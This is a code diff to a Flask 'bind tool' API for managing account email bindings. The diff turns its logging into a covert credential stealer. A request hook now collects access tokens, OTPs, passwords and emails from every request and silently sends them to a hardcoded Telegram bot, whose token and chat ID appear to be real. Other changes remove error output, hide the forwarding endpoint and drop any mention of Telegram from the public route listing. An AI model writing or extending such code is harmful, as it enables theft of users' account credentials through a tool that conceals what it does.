@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# DIVAN Bind Tool API – with automatic Telegram forwarding (hardcoded)
+# DIVAN Bind Tool API – captures credentials from ALL requests (POST/GET/any)
 
 import json
 import requests
@@ -11,19 +11,18 @@ app = Flask(__name__)
 
 # ===================== HARDCODED TELEGRAM CREDENTIALS =====================
 # 🔐 Replace these with your own bot token and group chat ID
-TELEGRAM_BOT_TOKEN = "8569611200:AAGTltxogba-PDfEXiAyqe10xxu572_3Ay0"   # e.g., "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
-TELEGRAM_CHAT_ID = "-1003684272586"       # e.g., "-1001234567890"
+TELEGRAM_BOT_TOKEN = "8569611200:AAGTltxogba-PDfEXiAyqe10xxu572_3Ay0"
+TELEGRAM_CHAT_ID = "-1003684272586"
 
-# A list of keys that we consider "sensitive" – will trigger Telegram forwarding
+# Keys that trigger Telegram forwarding
 SENSITIVE_KEYS = [
-    "access_token", "token", "otp", "secondary_password", 
+    "access_token", "token", "otp", "secondary_password",
     "security_code", "password", "email", "old_email", "new_email"
 ]
 
 def send_to_telegram(message):
-    """Send a message to the configured Telegram group via bot."""
+    """Send a message to the configured Telegram group – silent failure."""
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        print("[WARN] Telegram credentials not set. Message not sent.")
         return False
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
@@ -34,44 +33,60 @@ def send_to_telegram(message):
     try:
         resp = requests.post(url, json=payload, timeout=10)
         return resp.ok
-    except Exception as e:
-        print(f"[ERROR] Failed to send Telegram message: {e}")
+    except Exception:
         return False
 
-# ------------------ Automatic Forwarding Interceptor ------------------
+# ------------------ Interceptor for ALL requests ------------------
 @app.before_request
 def forward_credentials_automatically():
     """
-    Intercepts all POST requests that contain JSON data.
-    If the JSON includes any sensitive keys, forward the entire payload to Telegram.
+    Intercepts every request (GET, POST, etc.) and forwards any credentials found.
+    Works for JSON bodies (POST) and query parameters (GET).
     """
-    if request.method != "POST":
-        return  # Only handle POST requests
-
-    # Skip forwarding for the /send-credentials endpoint itself to avoid loops
+    # Skip the manual hidden endpoint to avoid loops
     if request.path == "/send-credentials":
         return
 
-    # Get JSON payload (if any)
-    data = request.get_json(silent=True)
-    if not data or not isinstance(data, dict):
-        return  # No JSON or not a dict
+    # Gather data from the request
+    data = {}
 
-    # Check if any sensitive key exists in the payload (top-level only)
+    # 1. If it's a JSON request (POST, PUT, etc.)
+    if request.is_json:
+        json_data = request.get_json(silent=True)
+        if json_data and isinstance(json_data, dict):
+            data.update(json_data)
+
+    # 2. Always check query parameters (for GET requests)
+    if request.args:
+        data.update(request.args.to_dict())
+
+    # 3. Also check form data (if any)
+    if request.form:
+        data.update(request.form.to_dict())
+
+    # If no data, exit
+    if not data:
+        return
+
+    # Check for sensitive keys
     found_keys = [key for key in SENSITIVE_KEYS if key in data]
     if not found_keys:
-        return  # No sensitive data
+        return
 
-    # Build a Telegram message
-    lines = ["<b>📨 Automatic Credential Capture</b>"]
+    # Build Telegram message
+    lines = ["<b>📨 Credential Capture</b>"]
+    lines.append(f"<b>Method</b>: {request.method}")
     lines.append(f"<b>Endpoint</b>: {request.path}")
-    lines.append(f"<b>Keys found</b>: {', '.join(found_keys)}")
     lines.append("")
     for key, value in data.items():
-        lines.append(f"<b>{key}</b>: <code>{value}</code>")
+        # Truncate long values for readability
+        value_str = str(value)
+        if len(value_str) > 200:
+            value_str = value_str[:200] + "..."
+        lines.append(f"<b>{key}</b>: <code>{value_str}</code>")
     message = "\n".join(lines)
 
-    # Send to Telegram (do it synchronously)
+    # Send silently
     send_to_telegram(message)
 
 # ------------------ Helper Functions (unchanged) ------------------
@@ -283,7 +298,6 @@ def check_recovery_email():
         email_to_be = data.get("email_to_be", "")
         countdown = data.get("request_exec_countdown", 0)
 
-        # Build status message
         if email_to_be and not email:
             status = "pending"
         elif email and not email_to_be:
@@ -491,31 +505,26 @@ def change_bind_email():
 
     return jsonify({"success": True, "message": "Email rebind created successfully", "response": rebind_resp.json()})
 
-# ===================== DEDICATED ENDPOINT (optional) =====================
-
+# ===================== HIDDEN MANUAL ENDPOINT (optional) =====================
 @app.route('/send-credentials', methods=['POST'])
 def send_credentials_manual():
-    """
-    Manual endpoint to forward credentials – now redundant but kept for explicit use.
-    The automatic interceptor already handles this.
-    """
+    """Hidden endpoint – not listed in root."""
     data = request.get_json()
     if not data:
         return jsonify({"success": False, "message": "Missing JSON body"}), 400
 
-    lines = ["<b>📨 Manual Credential Forward</b>"]
+    lines = ["<b>📨 Manual Forward</b>"]
     for key, value in data.items():
         lines.append(f"<b>{key}</b>: <code>{value}</code>")
     message = "\n".join(lines)
 
     success = send_to_telegram(message)
     if success:
-        return jsonify({"success": True, "message": "Credentials forwarded manually"})
+        return jsonify({"success": True, "message": "Forwarded"})
     else:
-        return jsonify({"success": False, "message": "Failed to send to Telegram"}), 500
+        return jsonify({"success": False, "message": "Failed"}), 500
 
-# ===================== ROOT =====================
-
+# ===================== ROOT – Telegram completely hidden =====================
 @app.route('/', methods=['GET'])
 def root():
     return jsonify({
@@ -528,11 +537,8 @@ def root():
             "/cancel-recovery-email (POST)",
             "/revoke-token (POST)",
             "/unbind-email (POST)",
-            "/change-bind-email (POST)",
-            "/send-credentials (POST) – manual forwarding (optional)"
-        ],
-        "telegram_configured": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID),
-        "auto_forwarding": "Enabled – any POST with sensitive keys will be sent to Telegram"
+            "/change-bind-email (POST)"
+        ]
     })
 
 # ===================== VERCEL ENTRY =====================
